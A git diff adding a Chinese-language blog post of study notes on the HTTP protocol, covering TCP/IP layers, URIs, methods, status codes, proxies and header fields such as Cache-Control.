@@ -145,6 +145,859 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2023/01/14/HTTP%E5%8D%8F%E8%AE%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="竹云">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome To QYZY's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/01/14/HTTP%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">HTTP协议</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-01-14 23:19:29 / 修改时间：23:19:40" itemprop="dateCreated datePublished" datetime="2023-01-14T23:19:29+08:00">2023-01-14</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="网络基础TCP-IP"><a href="#网络基础TCP-IP" class="headerlink" title="网络基础TCP/IP"></a>网络基础TCP/IP</h1><h2 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h2><p>不同的硬件、操作系统之间的通信需要一种规则，而我们把这种规则称为协议（protocol）。协议中存在各式各样的内容。从电缆的规格到IP地址的选定方法、寻找异地用户的方法、双方建立通信的顺序，以及web页面显示需要处理的步骤，等等。像这样<strong>把互联网相关联的协议集合起来总称为TCP/IP</strong></p>
+<h2 id="TCP-IP的分层管理"><a href="#TCP-IP的分层管理" class="headerlink" title="TCP/IP的分层管理"></a>TCP/IP的分层管理</h2><p>TCP/IP协议族按层次分别分为应用层、传输层、网络层和数据链路层。</p>
+<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>应用层决定了向用户提供应用服务时通信的活动。<br>如FTP（File Transfer Protocol，文件传输协议）和DNS（Domain Name Systyem，域名系统）服务。HTTP协议也处于该层。</p>
+<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据传输。<br>在传输层有两个性质不同的协议：TCP（Transmission Control Protocol，传输控制协议）和UDP（User Data Protocol，用户数据报协议）。</p>
+<h3 id="网络层（又名网络互连层）"><a href="#网络层（又名网络互连层）" class="headerlink" title="网络层（又名网络互连层）"></a>网络层（又名网络互连层）</h3><p>网络层用来处理在网络上流动的数据包。数据包时网络传输的最小数据单位。该层规定了通过怎样的路径到达对方计算机，并把数据包传送给对方。</p>
+<h3 id="链路层（又名数据链路层，网络接口层）"><a href="#链路层（又名数据链路层，网络接口层）" class="headerlink" title="链路层（又名数据链路层，网络接口层）"></a>链路层（又名数据链路层，网络接口层）</h3><p>用来处理连接网络的硬件部分。包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card，网络适配器，及网卡），及光纤等物理可见部分（海报可连接器等一切传输媒介）。</p>
+<h2 id="TCP-IP通信传输流"><a href="#TCP-IP通信传输流" class="headerlink" title="TCP/IP通信传输流"></a>TCP/IP通信传输流</h2><p>利用TCP/IP协议进行网络通信时，会通过分层顺序与对方进行通信。发送端从应用层往下走，接收端则往应用层往上走。<br>发送端在层与层之间传输数据时，每经过一层必定会被打上一个该层所属的首部信息。反之，接收端在层与层传递数据时，每经过一层会把对应的首部消去，这种把数据信息包装起来的做法称为<strong>封装</strong>。</p>
+<h1 id="与HTTP关系密切的协议：IP、TCP和DNS"><a href="#与HTTP关系密切的协议：IP、TCP和DNS" class="headerlink" title="与HTTP关系密切的协议：IP、TCP和DNS"></a>与HTTP关系密切的协议：IP、TCP和DNS</h1><h2 id="负责传输的IP协议"><a href="#负责传输的IP协议" class="headerlink" title="负责传输的IP协议"></a>负责传输的IP协议</h2><p>按层次分，IP（Internat Protocol）网际协议位于网络层。IP协议的作用时把各种书包传送给对方。而要保证确实传送到对方那里，则需要满足各类条件。其中两个重要的条件是IP地址和MAC地址（Media Access Control Address）。<br>IP地址指明了节点被分配到的地址，MAC地址是指网卡所属的固定地址。IP地址可以和MAC地址进行配对。IP地址可变换，但是MAC地址基本不会更改。<br>IP间的通信依赖MAC地址。通常经过多台计算机和网络设备中转才能连接到对方，中转时会利用下一站中转设备的MAC地址来搜索下一个中转目标。这时，会采用ARP协议（Address Resolution Protocol）。<strong>ARP协议是一种用以解析地址的协议，根据通信方的IP地址就可以反查出对应的MAC地址。</strong><br>在到达通信目标前的中转过程中，那些计算机和路由器等网络设备只能获悉很粗略的传输路线。这种机制称为<strong>路由选择（routing）</strong> ，<em>无论哪台计算机、哪台网络设备，它们都无法全面掌握互联网中的细节。</em></p>
+<h2 id="确保可靠的TCP协议"><a href="#确保可靠的TCP协议" class="headerlink" title="确保可靠的TCP协议"></a>确保可靠的TCP协议</h2><p>按层次分，TCP位于传输层，提供可靠的字节流服务。所谓的字节流服务（Byte Stream Service）是指，为了方便传输，将大块数据分割成以报文段（segment）为单位的数据包进行管理。  </p>
+<p>为了准确无误地将数据送达目标处，T。CP协议采用了<strong>三次握手（three-way handshaking）策略</strong>。握手过程中使用了TCP的标志（flag）–SYN（synchronize）和ACK(acknowledgement)。<br>发送端首先发送一个带SYN标志的数据包给对方。接收端收到后，回传一个带有SYN/ACK标志的数据包以示传达确认信息。最后，发送端再回传一个带ACK标志的数据包，代表“握手”结束。<br>若在握手过程中某个阶段莫名终端，TCP协议会再次以相同的顺序发送相同的数据包。</p>
+<h1 id="负责域名解析的DNS服务"><a href="#负责域名解析的DNS服务" class="headerlink" title="负责域名解析的DNS服务"></a>负责域名解析的DNS服务</h1><p>DNS（Domain Name System）服务是和HTTP协议一样位于应用层的协议。<strong>它提供域名到IP地址之间的解析服务</strong>。DNS协议提供通过域名查找IP地址，或逆向通过IP地址反查域名的服务。</p>
+<h1 id="URI和URL"><a href="#URI和URL" class="headerlink" title="URI和URL"></a>URI和URL</h1><ul>
+<li>URI（统一资源标识符）</li>
+<li>URL（Uniform Resource Locator,统一资源定位符）使用Web浏览器等访问Web页面时需要输入的网页地址。</li>
+</ul>
+<h2 id="统一资源标识符"><a href="#统一资源标识符" class="headerlink" title="统一资源标识符"></a>统一资源标识符</h2><ul>
+<li>Uniform<br>规定统一的格式可方便处理多种不同类型的资源，而不用根据上下文环境来识别资源指定的访问方式。另外，加入新增的协议方案（如https:或ftp:）也更容易。</li>
+<li>Resource<br>资源的定义是“可标识的任何东西”，资源不仅可以是单一的，也可以是多数的集合体。</li>
+<li>Identifier<br>表示可标识的对象。也称为标识符。</li>
+</ul>
+<p>综上所述，URI就是由某个协议方案表示的资源的定位标识符。协议方案是指访问资源所使用的协议类型名称。</p>
+<h2 id="URI格式"><a href="#URI格式" class="headerlink" title="URI格式"></a>URI格式</h2><p>表示指定的URI，要使用涵盖全部必要信息的绝对URI、绝对URL以及相对URL。相对URL，是指从浏览器中基本URI处指定的URL，形如<code>/image/logo.gif</code>。</p>
+<p><code>protocol :// hostname[:port] / path / [;parameters][?query]#fragment</code>  </p>
+<ul>
+<li>协议方案<br>使用http：或https：等协议方案名获取访问资源时要指定协议类型。也可使用data：或javascript：这类指定数据或脚本程序的方案名。</li>
+<li>服务器地址<br>使用绝对URI必须指定待访问的服务器地址。地址可以是类似hackr.jp这种DNS可解析的名称，或是192.168.1.1这类IPv4地址名，还可以是[0:0:0:0:0:0:0:1]这样用方括号括起来的IPv6地址名。  </li>
+<li>服务器端口号<br>指定服务器连接的网络端口号。若省略则自动使用默认端口号。</li>
+<li>带层次的文件路径</li>
+<li>查询字符串<br>针对已指定的文件路径内的资源，可以使用查询字符串传入任意参数。此项可选。</li>
+<li>片段标识符<br>使用片段标识符通常可标记处已获取资源中的子资源。可选。</li>
+</ul>
+<h1 id="简单的HTTP协议"><a href="#简单的HTTP协议" class="headerlink" title="简单的HTTP协议"></a>简单的HTTP协议</h1><h2 id="HTTP协议用于客户端和服务端之间的通信"><a href="#HTTP协议用于客户端和服务端之间的通信" class="headerlink" title="HTTP协议用于客户端和服务端之间的通信"></a>HTTP协议用于客户端和服务端之间的通信</h2><p>请求访问文本或图像的一端称为客户端，而提供资源响应的一端称为服务器端。</p>
+<h2 id="通过请求和响应的交换达成通信"><a href="#通过请求和响应的交换达成通信" class="headerlink" title="通过请求和响应的交换达成通信"></a>通过请求和响应的交换达成通信</h2><p><strong>请求报文是由请求方法、请求URI、协议版本、可选的请求首部字段和内容实体构成的。</strong><br><strong>响应报文基本上由协议版本、状态码（标识请求成功或失败的数字代码）、用以解释状态码的原因短语、可选的响应首部字段以及实体主体构成。</strong></p>
+<h2 id="HTTP是不保存状态的协议"><a href="#HTTP是不保存状态的协议" class="headerlink" title="HTTP是不保存状态的协议"></a>HTTP是不保存状态的协议</h2><p>HTTP是一种不保存状态，即无状态（stateless）协议。HTTP协议自身不对请求和响应之间的通信状态进行保存。为了实现期望的保持状态功能，引入了Cookie技术。</p>
+<h2 id="告知服务器意图的HTTP方法"><a href="#告知服务器意图的HTTP方法" class="headerlink" title="告知服务器意图的HTTP方法"></a>告知服务器意图的HTTP方法</h2><ul>
+<li>GET：获取资源<br>GET方法用来请求访问已被URI识别的资源，指定的资源经服务器端解析后返回响应内容。</li>
+<li>POST：传输实体主体</li>
+<li>PUT：传输文件<br>就像FTP协议的文件上传一样，要求再请求报文的主体中包含文件内容，然后保存到请求URI指定的位置。</li>
+<li>HEAD：获得报文首部</li>
+<li>DELETE：删除文件</li>
+<li>OPTIONS：询问支持的方法</li>
+<li>TRICE：追踪路径<br>发送请求时，在Max-Forwards首部字段中填入数值，每经过一个服务器端就将该数字减1，当数值刚好减到0时，就停止继续传输，最后接到请求的服务器端则返回状态码200 OK的响应。</li>
+<li>CONNECT：要求用隧道协议连接代理<br>CONNECT方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行TCP通信。主要使用SSL（Secure Sockets Layer，安全套接层）和TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。格式：<code>CONNECT代理服务器名：端口号HTTP版本</code></li>
+</ul>
+<h2 id="使用Cookie的状态管理"><a href="#使用Cookie的状态管理" class="headerlink" title="使用Cookie的状态管理"></a>使用Cookie的状态管理</h2><p>Cookie会根据从服务器端发送的响应报文内的一个叫做Set-Cookie的首部字段信息，通知客户端保存Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie值后发送出去。服务器端发现客户端发送过来的Cookie后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。</p>
+<h1 id="HTTP报文内的HTTP信息"><a href="#HTTP报文内的HTTP信息" class="headerlink" title="HTTP报文内的HTTP信息"></a>HTTP报文内的HTTP信息</h1><h2 id="HTTP报文"><a href="#HTTP报文" class="headerlink" title="HTTP报文"></a>HTTP报文</h2><p>HTTP报文大致可分为报文首部和报文主体两块，两者由空行（CR+LF）来划分。</p>
+<ul>
+<li>请求行<br>包含用于请求的方法、请求URI和HTTP版本。</li>
+<li>状态行<br>包含表明响应结果的状态码，原因语句和HTTP版本。  </li>
+<li>首部字段<br>包含表示请求和响应的各种条件和属性的各类首部。<br>一般有4种首部，分别时：通用首部、请求首部、响应首部和实体首部。</li>
+<li>其他<br>可能包含HTTP的RFC里未定义的首部（Cookie等）。</li>
+</ul>
+<h2 id="编码提升传输效率"><a href="#编码提升传输效率" class="headerlink" title="编码提升传输效率"></a>编码提升传输效率</h2><h3 id="压缩传输的内容编码"><a href="#压缩传输的内容编码" class="headerlink" title="压缩传输的内容编码"></a>压缩传输的内容编码</h3><p>内容编码指明应用在实体内容上的编码格式，并保持实体信息原样压缩。内容编码后的实体由客户端接收并负责解码。常用的内容编码有以下几种：</p>
+<ul>
+<li>gzip(GNU zip)</li>
+<li>compress(UNIX系统的标准压缩)</li>
+<li>deflate(zlib)</li>
+<li>identity(不进行编码)</li>
+</ul>
+<h3 id="分割发送的分块传输码"><a href="#分割发送的分块传输码" class="headerlink" title="分割发送的分块传输码"></a>分割发送的分块传输码</h3><p>在传输大容量数据时，通过把数据分割成多块，能够让浏览器逐步显示页面。这种把实体主体分块的功能称为分块传输编码（Chunked Transfer Coding）。分块传输编码会将实体主体分成多个部分（块）。每一块都会用十六进制来标记块的大小，而实体主体的最后一块会使用“0（CR+LF）”来标记。</p>
+<h2 id="发送多种数据的多部分对象合集"><a href="#发送多种数据的多部分对象合集" class="headerlink" title="发送多种数据的多部分对象合集"></a>发送多种数据的多部分对象合集</h2><p>发送邮件时，我们可以在邮件里写入文字并添加多份附件。这是因为采用了MIME（Multipurpose Internet Mail Extensions，多用途因特网邮件扩展）机制。他允许邮件处理文本、图片、视频等多个不同类型的数据。而在MIME扩展种会使用一种称为多部分对象集合（Multipart）的方法，来容纳多份不同类型的数据。<br>多部分对象集合包含的对象如下：</p>
+<ul>
+<li>multipart/form-data<br>在Web表单文件上传时使用。</li>
+<li>multipart/byteranges<br>状态码206响应<br>报文包含了多个范围的内容时使用  </li>
+</ul>
+<p>在HTTP报文种使用多部分对象集合时，需要在首部字段里加上Content-type。使用boundary字符串来划分多部分对象集合指明的各类实体。在boundary字符串指定的各个实体的起始行之前插入“–”标记。而在多部分对象集合对应的字符串的最后插入“–”标记作为结束。<br>多部分对象集合的每个部分类型中，都可以含有首部字段。另外，可以在某个部分中嵌套使用多部分对象集合。  </p>
+<h2 id="获取部分内容的范围请求"><a href="#获取部分内容的范围请求" class="headerlink" title="获取部分内容的范围请求"></a>获取部分内容的范围请求</h2><p>指定范围发送的请求叫做范围请求（Range Request），执行范围请求时，会用到首部字段Range来指定资源的byte范围。指定形式如下：</p>
+<ul>
+<li>5001~10000字节<br><code>Range：bytes=5001-10000</code></li>
+<li>从5001字节之后全部的<br><code>Range：bytes=5001-</code></li>
+<li>从一开始到3000字节和5000~7000字节的多重范围<br><code>Range：bytes=-3000，5000，7000</code>  </li>
+</ul>
+<p>针对范围请求，响应会返回状态码为206 Partial Content的响应请求报文。另外，对于多重范围的范围请求，响应会在首部字段Content-Type标明multipart/byteranges后返回响应报文。<br>如果服务器端无法响应范围请求，则会返回状态码200 OK和完整的实体内容。</p>
+<h2 id="内容协商返回最合适的内容"><a href="#内容协商返回最合适的内容" class="headerlink" title="内容协商返回最合适的内容"></a>内容协商返回最合适的内容</h2><p>内容协商机制是指客户端和服务器端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。内容协商会以响应资源的语言、字符集、编码方式等作为判断的基准。包含在请求报文中的某些首部字段（如下）就是判断的基准。</p>
+<ul>
+<li>Accept</li>
+<li>Accept-Charset</li>
+<li>Accept-Encoding</li>
+<li>Accept-Language</li>
+<li>Content-Language</li>
+</ul>
+<p>内容协商技术有以下三种类型</p>
+<ul>
+<li>服务器驱动协商（Server-driven Negotiation）<br>由服务器端进行内容协商。以请求的首部字段为参考，在服务端自动处理</li>
+<li>客户端驱动协商（Agent-driven Negotiation）<br>由客户端进行内容协商的方式。用户从浏览器显示的可选项列表中手动选择。还可以利用JavaScript脚本在Web页面上自动进行上述选择。</li>
+<li>透明协商（Transparent Negotiation）<br>是服务器驱动和客户端驱动的结合体，是由服务器端和客户端各自进行内容协商的一种办法。</li>
+</ul>
+<h1 id="返回结果的HTTP状态码"><a href="#返回结果的HTTP状态码" class="headerlink" title="返回结果的HTTP状态码"></a>返回结果的HTTP状态码</h1><table>
+<thead>
+<tr>
+<th></th>
+<th>类别</th>
+<th>原因短语</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1XX</td>
+<td>Informational（信息性状态码）</td>
+<td>接收的请求正在处理</td>
+</tr>
+<tr>
+<td>2XX</td>
+<td>Success（成功状态码）</td>
+<td>请求正常处理完毕</td>
+</tr>
+<tr>
+<td>3XX</td>
+<td>Redirection（重定向状态码）</td>
+<td>需要进行附加操作以完成请求</td>
+</tr>
+<tr>
+<td>4XX</td>
+<td>Client Error（客户端错误状态码）</td>
+<td>服务区无法处理请求</td>
+</tr>
+<tr>
+<td>5XX</td>
+<td>Server Error（服务器错误状态码）</td>
+<td>服务器处理请求出错</td>
+</tr>
+</tbody></table>
+<h2 id="2XX成功"><a href="#2XX成功" class="headerlink" title="2XX成功"></a>2XX成功</h2><p>2XX的响应结果表明请求被正常处理了。</p>
+<ul>
+<li>200 OK<br>表示从客户端发来的请求在服务器端被正常处理了。</li>
+<li>204 No Content<br>该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体成分。</li>
+<li>206 Partial Content<br>该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容</li>
+</ul>
+<h2 id="3XX重定向"><a href="#3XX重定向" class="headerlink" title="3XX重定向"></a>3XX重定向</h2><p>3XX响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。</p>
+<ul>
+<li>301 Moved Permanently<br>永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应使用资源现在所指的URI</li>
+<li>302 Found<br>临时性重定向。该状态码表示请求的资源已被分配了新的URI，希望用户（本次）能使用新的URI访问。</li>
+<li>303 See Other<br>该状态码表示由于对应的资源存在另一个URI，应使用GET方法定向获取请求的资源。</li>
+<li>304 Not Modidied<br>该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但因发生请求未满足条件的情况后，直接返回304 Not Modified（服务器端资源未改变，可直接使用客户端未过期的缓存）。304虽然被划分在3XX类别中，但是和重定向没有关系。</li>
+<li>307 Temporary Redirect<br>临时重定向。该状态码与302 Found有着相同的含义。尽管302标准禁止POST变换成GET，但实际使用时大家并不遵守。307会遵照浏览器标准，不会从POST变成GET。</li>
+</ul>
+<h2 id="4XX客户端错误"><a href="#4XX客户端错误" class="headerlink" title="4XX客户端错误"></a>4XX客户端错误</h2><p>4XX的响应结果表明客户端是发生错误的原因所在。</p>
+<ul>
+<li>400 Bad Requset<br>该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像200 OK一样对待该状态码。</li>
+<li>401 Unauthorized<br>该状态码表示发送的请求需要有通过HTTP认证（BASIC认证、DIGEST认证）的认证信息。另外若之前已进行过1次请求，则表示用户认证失败。<br>返回含有401响应必须包含一个适用于被请求资源的WWW-Authenticate首部用以质询（challenge）用户信息。当浏览器初次接收到401响应，会弹出认证用的对话窗口。</li>
+<li>403 Forbidden<br>该状态码表明对请求资源的访问被服务器拒绝了。未获得文件系统的访问授权，访问授权出现某些问题（从未授权的发送源IP地址试图访问）等列举的情况都可能是发生403的原因。</li>
+<li>404 Not Found<br>该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。</li>
+</ul>
+<h2 id="5XX服务器错误"><a href="#5XX服务器错误" class="headerlink" title="5XX服务器错误"></a>5XX服务器错误</h2><p>5XX的响应结果表明服务器本身发生错误。</p>
+<ul>
+<li>500 Internal Server Error<br>该状态码表明服务器端在执行请求时发生了错误。也有可能是Web应用存在的bug或某些临时的故障。</li>
+<li>503 Server unavailable<br>该状态码表明服务器暂时处于超负荷或正在进行停机维护，现在无法处理请求。</li>
+</ul>
+<h1 id="与HTTP协作的Web服务器"><a href="#与HTTP协作的Web服务器" class="headerlink" title="与HTTP协作的Web服务器"></a>与HTTP协作的Web服务器</h1><h2 id="用单台虚拟主机实现多个域名"><a href="#用单台虚拟主机实现多个域名" class="headerlink" title="用单台虚拟主机实现多个域名"></a>用单台虚拟主机实现多个域名</h2><p>HTTP/1.1规范允许一台HTTP服务器搭建多个Web站点。<br>在互联网上，域名通过DNS服务器映射到IP地址（域名解析）之后访问目标网站。可见，当请求发送到服务器时，已经是以IP地址形式访问了。在相同的IP地址下，由于虚拟主机可以寄存多个不同主机名和域名的Web网站，因此在发送HTTP请求时，必须在Host首部内完整指定主机名或域名的URI。</p>
+<h2 id="通信数据转发程序：代理、网关、隧道"><a href="#通信数据转发程序：代理、网关、隧道" class="headerlink" title="通信数据转发程序：代理、网关、隧道"></a>通信数据转发程序：代理、网关、隧道</h2><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端“中间人”的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。  </p>
+<ul>
+<li>缓存代理<br>代理转发响应时，缓存代理（Caching Proxy）会预先将资源的副本（缓存）保存在代理服务器上。当代理再次接到对相同资源的请求时，就可以不从源服务器那里获取资源，而是将之前缓存的资源作为响应返回。</li>
+<li>透明代理<br>转发请求或响应时，不对报文做任何加工的代理类型被称作透明代理（Transparent Proxy）。反之，对报文内容进行加工的代理被称为非透明代理。</li>
+</ul>
+<h3 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h3><p>网关的工作机制和代理十分相似。而网关能使通信线路上的服务器提供非HTTP协议服务。利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。比如，网关可以连接数据库，使用SQL语句查询数据。另外，在Web购物网站上进行信用卡结算时，网关可以和信用卡结算系统联动。  </p>
+<h3 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h3><p>隧道可按要求建立起一条与其他服务器的通信线路，届时使用SSL等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。<br>隧道本身不会去解析HTTP请求。也就是说，请求保持原样中转给之后的服务器。隧道会在通信双方断开连接时结束。</p>
+<h1 id="HTTP首部"><a href="#HTTP首部" class="headerlink" title="HTTP首部"></a>HTTP首部</h1><h2 id="HTTP报文首部"><a href="#HTTP报文首部" class="headerlink" title="HTTP报文首部"></a>HTTP报文首部</h2><p>在请求中，HTTP报文由方法、URI、HTTP版本、HTTP首部字段等部分构成。<br>在响应中，HTTP报文由HTTP版本、状态码（数字和原因短语）、HTTP首部字段3部分构成。</p>
+<h2 id="HTTP首部字段"><a href="#HTTP首部字段" class="headerlink" title="HTTP首部字段"></a>HTTP首部字段</h2><h3 id="HTTP首部字段结构"><a href="#HTTP首部字段结构" class="headerlink" title="HTTP首部字段结构"></a>HTTP首部字段结构</h3><p>HTTP首部字段是由首部字段名和字段值构成的，中间用冒号“：”分隔<br><code>首部字段名:字段值</code><br>另外，单个HTTP首部字段可以有多个值，如下所示：<br><code>Keep-Alive:timeout=15,max=100</code></p>
+<h3 id="HTTP首部字段类型"><a href="#HTTP首部字段类型" class="headerlink" title="HTTP首部字段类型"></a>HTTP首部字段类型</h3><ul>
+<li>通用首部字段<br>请求包围和响应报文两方都会使用的首部。</li>
+<li>请求首部字段<br>从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容、客户端信息、响应内容相关优先级等信息。</li>
+<li>响应首部字段<br>从服务器向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息。</li>
+<li>实体首部字段<br>针对请求报文和响应报文的实体部分使用的首部。补充了资源内容和更新时间等与实体有关的信息。</li>
+</ul>
+<h3 id="End-to-end首部和Hop-by-hop首部"><a href="#End-to-end首部和Hop-by-hop首部" class="headerlink" title="End-to-end首部和Hop-by-hop首部"></a>End-to-end首部和Hop-by-hop首部</h3><ul>
+<li>端到端首部（End-to-end Header）<br>分在此类别中的首部会转发给请求/响应对应的最终接收目标，且必须保存在由缓存生成的响应中，另外规定它必须被转发。</li>
+<li>逐跳首部（Hop-by-hop Header）<br>分在此类中的首部只对单词转发有效，会因通过缓存或代理而不再转发。HTTP/1.1和之后版本中，如果要使用hop-by-hop首部，需提供Connection首部字段。<ul>
+<li>Connection</li>
+<li>Keep-Alive</li>
+<li>Proxy-Authenticate</li>
+<li>Proxy-Authorization</li>
+<li>Trailer</li>
+<li>TE</li>
+<li>Transfer-Encoding</li>
+<li>Upgrade</li>
+</ul>
+</li>
+</ul>
+<h2 id="通用首部字段"><a href="#通用首部字段" class="headerlink" title="通用首部字段"></a>通用首部字段</h2><h3 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h3><p>通过指定首部字段Cache-Control的指令，就能操作缓存的工作机制。</p>
+<blockquote>
+<p>表示是否能缓存的指令</p>
+</blockquote>
+<ul>
+<li>public<br>当指定使用public指令时，则明确表明其他用户也可利用缓存。</li>
+<li>private<br>当指定private指令后，响应只以特定的用户作为对象，这与public指令的行为相反。缓存服务器会对该特定用户提供资源缓存的服务，对于其他用户发送过来的请求，代理服务器则不会返回缓存。</li>
+<li>no-cache<br>使用no-cache指令的目的是为了防止从缓存中返回过期的资源。客户端发送的请求中如果包含no-cache指令，则表示客户端将不会接收缓存过的响应。于是，“中间”的缓存服务器必须把客户端请求转发给源服务器。如果服务器返回的响应中包含no-cache指令，那么缓存服务器不能对资源进行缓存。源服务器以后也不再对缓存服务器请求中提出的资源有效性进行确认，且禁止其对响应资源进行缓存操作。<blockquote>
+<p>控制可执行缓存的对象的指令 </p>
+</blockquote>
+</li>
+<li>no-store<br>当使用no-store指令时，暗示请求（和对应的响应）或响应中包含机密信息。因此，该指令规定缓存不能再本地存储请求或响应的任一部分。<blockquote>
+<p>指定缓存期限和认证的指令。</p>
+</blockquote>
+</li>
+<li>s-maxage<br><code>s-maxage=604800(单位：秒)</code><br>s-maxage指令的功能和max-age指令的相同，他们的不同点是s-maxage指令只适用于供多位用户使用的公共缓存服务器。另外，当使用s-maxage指令后，则直接忽略对Expires首部字段及max-age指令的处理。</li>
+<li>max-age<br><code>max-age=604800(单位：秒)</code><br>当客户端发送的请求中包含max-age指令时，如果判定缓存资源的缓存时间数值比指定时间的数值更小，那么客户端就接收缓存的资源。</li>
+<li>min-fresh<br><code>min-fresh=60(单位：秒)</code><br>min-fresh指令要求缓存服务器返回至少还未过指定时间的缓存资源。</li>
+<li>max-stale<br><code>max-stale=3600(单位：秒)</code><br>使用max-stale可指示缓存资源，即使过期也照常接收。如果未指定参数值，那么无论过多久，客户端都会接收响应；如果指令中指定了具体数值，那么即使过期，只要仍处于max-stale指定的时间内，仍旧会被客户端接收。</li>
+<li>only-if-cached<br>表示客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回。若发生请求缓存服务器的本地缓存无响应，则返回状态码504 Gateway Timeout</li>
+<li>must-revalidate<br>代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。另外，使用must-revalidate指令会忽略请求的max-stale指令。</li>
+<li>proxy-revalidate<br>要求所有的缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性。</li>
+<li>no-transform<br>规定无论是在请求还是响应中，缓存都不能改变实体主体的媒体类型。防止缓存或代理压缩图片等类似操作。</li>
+</ul>
+<h3 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h3><ul>
+<li>控制不再转发给代理的首部字段<br><code>Connection:不再转发的首部字段名</code><br>即（Hop-by-hop首部）</li>
+<li>管理持久连接<br>HTTP/1.1版本的默认连接都是持久连接。当服务器端想明确断开连接时，则指定Connection首部字段的值为Close。<br>HTTP/1.1之前的版本的默认连接都是非持久连接。为此，如果想在旧版本的HTTP协议上维持持续连接。则需要指定Connection首部字段的值为Keep-Alive。</li>
+</ul>
+<h3 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h3><p>表明创建HTTP报文的日期和时间</p>
+<h3 id="Pragma"><a href="#Pragma" class="headerlink" title="Pragma"></a>Pragma</h3><p>Pragma是HTTP/1.1之前版本的历史遗留字段，仅作为与HTTP/1.0的向后兼容而定义。规范定义的形式唯一，如下所示：<br><code>Pragma:no-cache</code><br>该首部字段属于通用首部字段，但只用在客户端发送的请求中。客户端会要求所有的中间服务器不返回缓存的资源。  </p>
+<h3 id="Trailer"><a href="#Trailer" class="headerlink" title="Trailer"></a>Trailer</h3><p>首部字段Trailer会事先说明在报文主体后记录了哪些首部字段。  </p>
+<h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><p>规定了传输报文主体时采用的编码方式。</p>
+<h3 id="Upgrade"><a href="#Upgrade" class="headerlink" title="Upgrade"></a>Upgrade</h3><p>用于检测HTTP协议及其他协议是否可以使用更高的版本进行通信。<br><code>Upgrade: TLS/1.0</code> </p>
+<h3 id="Via"><a href="#Via" class="headerlink" title="Via"></a>Via</h3><p>为了追踪客户端与服务器之间的请求和响应报文的传输路径。<br>报文经过代理或网关时，会先在首部字段Via中附加该服务器的信息，然后再进行转发。 </p>
+<h3 id="Warning"><a href="#Warning" class="headerlink" title="Warning"></a>Warning</h3><p>告知用户一些与缓存相关的问题的警告。格式如下，最后的日期时间可省略。<br><code>Warning:[警告码][警告的主机：端口号]&quot;[警告内容]&quot;([日期时间])</code><br>|警告码|警告内容|说明|<br>|——|——-|—-|<br>|110|Response is stale(响应已过期)|代理返回已过期的资源|<br>|111|Revalidation failed（再验证失败）|代理再验证资源有效性时失败（服务器无法到达等原因）|<br>|112|Disconnection operation（断开连接操作）|代理与互联网连接被故意切断|<br>|113|Heuristic expiration（试探性过期）|响应的使用期超过24小时（有效缓存的设定时间大于24小时的情况下）|<br>|199|Miscellaneous warning（杂项警告）|任意的警告内容|<br>|214|Transformmation applied（使用了转换）|代理对内容编码或媒体类型执行了某些处理时|<br>|299|Miscellaneous persistent warning（持久杂项警告）|任意的警告内容|</p>
